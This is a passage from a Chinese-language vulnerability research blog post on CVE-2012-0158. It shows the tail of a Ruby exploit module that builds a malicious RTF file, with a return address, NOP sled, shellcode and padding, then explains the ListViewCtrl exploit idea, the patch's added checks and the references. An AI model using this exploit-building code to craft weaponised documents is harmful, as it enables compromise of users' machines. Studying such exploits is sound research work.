<span class="comment">#* 将 shellcode 与返回地址包含在 RTF 文件中</span></span><br><span class="line">        content &lt;&lt; ret_address</span><br><span class="line">        content &lt;&lt; <span class="string">&quot;9090909090909090&quot;</span></span><br><span class="line">        content &lt;&lt; shellcode</span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;\n&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        print_status(<span class="string">&quot;Creating &#x27;<span class="subst">#&#123;datastore[<span class="string">&#x27;FILENAME&#x27;</span>]&#125;</span>&#x27; file ...&quot;</span>)</span><br><span class="line">        file_create(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>该 exp 的利用思路经典而简单明了————生成一个嵌入了恶意 MSComctlLib.ListViewCtrl.2 控件的 RTF 文件，其中控件被插入了 shellcode————在此就不过多赘述</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>补丁后的程序在内存复制前的判断条件修改如下：</p>
<ul>
<li>v7(前四个字节) &#x3D;&#x3D; Cobj</li>
<li>dwVersion &#x3D;&#x3D; 0x64</li>
<li>dwBytes &#x3D;&#x3D; 8</li>
</ul>
<p>全部满足方可接着执行加载方法</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/CVE-2012-0158-An-Anatomy-of-a-Prolific-Exploit.PDF" >CVE-2012-0158 An Anatomy of a Prolific Exploit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2012-0158" >NVD - CVE-2012-0158<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158" >CVE - CVE-2012-0158<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-xc3w-wqx5-qrf9" >Github - CVE-2012-0158<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://book.douban.com/subject/26830238/" >漏洞战争<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-268068.htm" >看雪论坛精华帖<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-700363-1-1.html" >吾爱破解精华帖<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/91643" >永远的经典：CVE-2012-0158漏洞分析、利用、检测和总结<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> CVE-2012-0158 漏洞研究</li>
        <li><strong>Author:</strong> 7erry</li>
        <li><strong>Created at
                :</strong> 2024-08-18 19:09:19</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-08-18 19:09:19
            </li>
        
        <li>
            <strong>Link:</strong> https://7erryx.github.io/2024/08/18/Vulnerability Investigation/CVE-2012-0158-漏洞研究/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/09/09/Vulnerability%20Investigation/CVE-2010-2553-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">CVE-2010-2553 漏洞研究</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/08/08/Vulnerability%20Investigation/CVE-2011-0104-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">CVE-2011-0104 漏洞研究</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">CVE-2012-0158 漏洞研究</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E5%88%86%E6%9E%90"><span class="nav-text">Exploit 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2020</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">7erry</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        65 posts in total
                    </span>
                    
                        <span>
                            217.5k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script>
    
    
<script src="/js/build/plugins/mermaid.js"></script>









    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>